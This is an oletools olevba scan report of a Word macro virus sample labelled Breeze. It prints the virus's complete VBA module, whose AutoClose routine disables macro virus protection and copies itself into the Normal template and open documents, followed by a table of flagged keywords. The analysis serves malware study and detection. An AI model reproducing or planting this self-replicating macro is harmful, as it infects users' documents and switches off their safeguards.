olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Breeze-71b588732d03306b43e9ea6dd36d42c1cd549168
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Breeze-71b588732d03306b43e9ea6dd36d42c1cd549168 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO weather.bas 
in file: Virus.MSWord.Breeze-71b588732d03306b43e9ea6dd36d42c1cd549168 - OLE stream: 'Macros/VBA/weather'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
If Len(NormalTemplate.VBProject.VBComponents.Item("weather")) < 1 Then Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "weather", wdOrganizerObjectProjectItems
If Len(ActiveDocument.VBProject.VBComponents.Item("weather")) < 1 Then Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "weather", wdOrganizerObjectProjectItems
System.PrivateProfileString("", "HKEY_CURRENT_USER\", "Weather") = "f0re's Macro Contest Contribution !"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

